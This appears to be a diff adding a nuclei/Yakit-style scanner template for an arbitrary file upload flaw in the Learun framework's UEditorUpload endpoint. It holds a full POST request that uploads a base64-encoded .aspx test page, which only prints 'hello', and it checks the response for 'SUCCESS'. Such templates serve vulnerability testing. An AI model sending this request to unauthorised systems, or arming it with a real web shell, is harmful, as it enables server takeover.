@@ -1,0 +1,38 @@
+id: learun-upload
+
+info:
+  name: 力软敏捷开发框架UEditorUpload任意文件上传
+  author: admin
+  severity: critical
+  description: 力软敏捷开发框架UEditorUpload任意文件上传
+  metadata:
+    max-request: 1
+    shodan-query: ""
+    verified: true
+  yakit-info:
+    sign: 2d53af34188768437a330346bdd26286
+
+http:
+- method: POST
+  path:
+  - '{{RootURL}}/Utility/UEditorUpload'
+  headers:
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+    Content-Type: application/x-www-form-urlencoded
+    Upgrade-Insecure-Requests: "1"
+  body: Base64=true&Base64Filename=1.aspx&UploadFieldName=upfile&PathFormat=/ueditor/2019/&upfile=PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiAlPgo8JSBSZXNwb25zZS5Xcml0ZSgiaGVsbG8iKTsgJT4=
+
+  max-redirects: 3
+  disable-cookie: true
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - SUCCESS
+    condition: and
+
+
+# Generated From WebFuzzer on 2026-03-25 10:18:17
